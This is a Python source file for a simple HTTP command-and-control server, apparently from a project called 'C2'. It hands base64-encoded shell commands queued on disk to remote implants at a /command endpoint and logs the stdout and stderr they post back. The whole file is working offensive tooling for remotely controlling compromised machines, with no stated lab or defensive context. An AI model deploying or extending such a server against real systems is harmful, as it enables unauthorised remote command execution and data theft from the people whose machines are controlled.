#!/usr/bin/env python3

from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.request import urlparse
from base64 import b64encode, b64decode
from pathlib import Path
from datetime import datetime, UTC
import json
import shutil

ROOT = Path(__file__).resolve().parents[2]  # Projects/C2
LIVE = ROOT / "live"
QUEUED = LIVE / "queued"
COMPLETED = LIVE / "completed"

def _normalize_newlines(s): return str(s).replace("\r\n", "\n").replace("\r", "\n")

def _shell_view_from_output(out):
    if isinstance(out, dict):
        stdout = _normalize_newlines(out.get("stdout") or "")
        stderr = _normalize_newlines(out.get("stderr") or "")
        rc = out.get("returncode")

        chosen = stdout if stdout.strip() else stderr
        chosen = chosen.rstrip("\n")
        if (not chosen) and (rc not in (None, 0)): return f"(exit {rc})\n"
        return (chosen + "\n") if chosen and not chosen.endswith("\n") else chosen

    if isinstance(out, list) and len(out) == 2:
        stdout = _normalize_newlines(out[0] or "")
        stderr = _normalize_newlines(out[1] or "")
        chosen = stdout if stdout.strip() else stderr
        chosen = chosen.rstrip("\n")
        return (chosen + "\n") if chosen and not chosen.endswith("\n") else chosen

    return _normalize_newlines(out)


# Helper
def to_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64encode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer

def from_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64decode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer
    
# Server
class ReverseC2Handler(SimpleHTTPRequestHandler):

    def get_command(self):
        LIVE.mkdir(parents=True, exist_ok=True)
        QUEUED.mkdir(parents=True, exist_ok=True)
        COMPLETED.mkdir(parents=True, exist_ok=True)

        command_files = sorted(QUEUED.glob("*-out.txt"), key=lambda p: p.stat().st_mtime)
        if len(command_files) <= 0: command_files = sorted(LIVE.glob("*-out.txt"), key=lambda p: p.stat().st_mtime)
        if len(command_files) <= 0: return None

        command_path = command_files[0]
        command_raw = command_path.read_text()

        try:
            cmd_obj = json.loads(command_raw)
            if isinstance(cmd_obj, dict):
                job_id = command_path.name.replace("-out.txt", "")
                cmd_obj["job_id"] = job_id
                command_raw = json.dumps(cmd_obj)
        except Exception:
            pass

        return command_raw


    def do_GET(self):
        url = urlparse(self.path)
        if url.path != "/command": return super().do_GET()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        command = self.get_command()
        if not command: return self.wfile.write(b"")
        self.wfile.write(to_base64(command, to_bytes=True))

    def do_POST(self):
        url = urlparse(self.path)
        if url.path != "/command": return super().do_POST()
        content_length = int(self.headers.get("Content-Length"))
        result = self.rfile.read(content_length).decode("utf-8")
        result = from_base64(result)
        LIVE.mkdir(parents=True, exist_ok=True)
        QUEUED.mkdir(parents=True, exist_ok=True)
        COMPLETED.mkdir(parents=True, exist_ok=True)

        job_id = datetime.now(UTC).strftime("%Y%m%dT%H%M%S.%fZ")
        try:
            obj = json.loads(result)
            if isinstance(obj, dict):
                job_id = obj.get("job_id") or job_id
        except Exception:
            obj = None

        (COMPLETED / f"{job_id}-in.json").write_text(result)

        pretty = _shell_view_from_output(obj.get("output")) if isinstance(obj, dict) and "output" in obj else _normalize_newlines(result)
        (COMPLETED / f"{job_id}-in.txt").write_text(pretty)

        cmd_path = QUEUED / f"{job_id}-out.txt"
        if not cmd_path.exists(): cmd_path = LIVE / f"{job_id}-out.txt"
        if cmd_path.exists():
            shutil.move(str(cmd_path), str(COMPLETED / cmd_path.name))

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"")

def main():
    try:
        reverse_c2_handler = HTTPServer(('', 8080), ReverseC2Handler)
        reverse_c2_handler.serve_forever()
    except KeyboardInterrupt:
        pass

if __name__ == '__main__': main()
